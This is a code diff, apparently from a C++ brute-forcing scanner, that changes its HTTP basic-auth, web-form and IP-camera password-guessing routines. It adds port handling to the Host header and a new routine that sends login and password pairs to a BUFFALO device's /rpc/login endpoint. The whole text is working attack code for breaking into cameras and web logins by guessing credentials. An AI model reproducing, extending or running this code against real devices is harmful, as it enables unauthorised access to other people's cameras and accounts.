@@ -381,6 +381,11 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 	strcat(hRqst, path);
 	strcat(hRqst, " HTTP/1.1\r\nHost: ");
 	strcat(hRqst, ip);
+	if(port != 80){
+		strcat(hRqst, ":");
+		char tbuff[16] = {0};
+		strcat(hRqst, itoa(port, tbuff, 10));
+	};
 	if(cookieLen != 0)
 	{
 		strcat(hRqst, "\r\nCookie: ");
@@ -577,6 +582,11 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				strcat(request, path);
 				strcat(request, " HTTP/1.1\r\nHost: ");
 				strcat(request, ip);
+				if(port != 80){
+					strcat(request, ":");
+					char tbuff[16] = {0};
+					strcat(request, itoa(port, tbuff, 10));
+				};
 				if(cookieLen != 0)
 				{
 					strcat(request, "\r\nCookie: ");
@@ -614,6 +624,11 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				strcat(request, path);
 				strcat(request, " HTTP/1.1\r\nHost: ");
 				strcat(request, ip);
+				if(port != 80){
+					strcat(request, ":");
+					char tbuff[16] = {0};
+					strcat(request, itoa(port, tbuff, 10));
+				};
 				if(cookieLen != 0)
 				{
 					strcat(request, "\r\nCookie: ");
@@ -1934,8 +1949,7 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 					strcat(request, "\r\nCookie: ");
 					strcat(request, cookie);
 				};
-				strcat(request, "\r\nContent-type: application/x-www-form-urlencoded\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: us-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nConnection: close\r\n");
-				strcat(request, "Content-length: ");
+				strcat(request, "\r\nContent-type: application/x-www-form-urlencoded\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: us-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nConnection: close\r\nContent-Length: ");
 				strcat(request, itoa(strlen(argData), b, 10));
 				strcat(request, "\r\n\r\n");
 
@@ -2324,6 +2338,10 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 	{
 		negVector.push_back("Password Error");
 	}
+	else if(strcmp(SPEC, "BUFFALO") == 0)
+	{
+		negVector.push_back("403 Forbidden");
+	}
 	else
 	{
 		stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");
@@ -2358,7 +2376,12 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 				strcat(request, "&pwd=");
 				strcat(request, pass);
 				strcat(request, " HTTP/1.1\r\nHost: ");
-				strcat(request, ip);
+				strcat(request, ip);				
+				if(port != 80){
+					strcat(request, ":");
+					char tbuff[16] = {0};
+					strcat(request, itoa(port, tbuff, 10));
+				};
 				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
 			}
 			else if(strcmp(SPEC, "GEO") == 0)
@@ -2369,6 +2392,11 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 				strcat(request, pass);
 				strcat(request, " HTTP/1.1\r\nHost: ");
 				strcat(request, ip);
+				if(port != 80){
+					strcat(request, ":");
+					char tbuff[16] = {0};
+					strcat(request, itoa(port, tbuff, 10));
+				};
 				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
 			}
 			else if(strcmp(SPEC, "EasyCam") == 0)
@@ -2383,6 +2411,11 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 				strcat(request, pass);
 				strcat(request, " HTTP/1.1\r\nHost: ");
 				strcat(request, ip);
+				if(port != 80){
+					strcat(request, ":");
+					char tbuff[16] = {0};
+					strcat(request, itoa(port, tbuff, 10));
+				};
 				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
 			}
 			else if(strcmp(SPEC, "Foscam") == 0)
@@ -2397,6 +2430,11 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 				strcat(request, pass);
 				strcat(request, " HTTP/1.1\r\nHost: ");
 				strcat(request, ip);
+				if(port != 80){
+					strcat(request, ":");
+					char tbuff[16] = {0};
+					strcat(request, itoa(port, tbuff, 10));
+				};
 				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
 			}
 			else if(strcmp(SPEC, "AVIOSYS") == 0)
@@ -2407,7 +2445,38 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 				strcat(request, pass);
 				strcat(request, " HTTP/1.1\r\nHost: ");
 				strcat(request, ip);
+				if(port != 80){
+					strcat(request, ":");
+					char tbuff[16] = {0};
+					strcat(request, itoa(port, tbuff, 10));
+				};
 				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
+			}
+			else if(strcmp(SPEC, "BUFFALO") == 0)
+			{
+				strcpy(request, "POST /rpc/login HTTP/1.1\r\nHost: ");
+				strcat(request, ip);
+				if(port != 80){
+					strcat(request, ":");
+					char tbuff[16] = {0};
+					strcat(request, itoa(port, tbuff, 10));
+				};
+				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: keep-alive");
+				int loginLength = strlen(login);
+				int passLength = strlen(pass);
+				int sz = loginLength + passLength + strlen("user=&password=");
+				char *passString = new char[sz + 1];
+				ZeroMemory(passString, sizeof(passString));
+				strcpy(passString, "user=");
+				strcat(passString, login);
+				strcat(passString, "&password=");
+				strcat(passString, pass);
+				strcat(request, "\r\nContent-Length: ");
+				char tempBuff[16] = {0};
+				strcat(request, itoa(sz, tempBuff, 10));
+				strcat(request, "\r\n\r\n");
+				strcat(request, passString);
+				delete []passString;
 			};
 
 			int res = _webLoginSeq(request, login, pass, ip, port, passCounter, SPEC, negVector);
@@ -2534,10 +2603,12 @@ int Connector::_ConnectToPort(char *ip, const char *portC, char *hl)
 	int strFlag = 0;
 	strcpy(mes, buff1);
 	strcat(mes, ip);
-	strcat(mes, ":");
-	strcat(mes, portC);
-	strcat(mes, buff2);
 	int port = atoi(portC);
+	if(port != 80){
+		strcat(mes, ":");
+		strcat(mes, portC);
+	};
+	strcat(mes, buff2);
 	int cRes;
 
 	if(port == 443)		cRes = _EstablishSSLConnection(ip, port, mes, &CSTR);
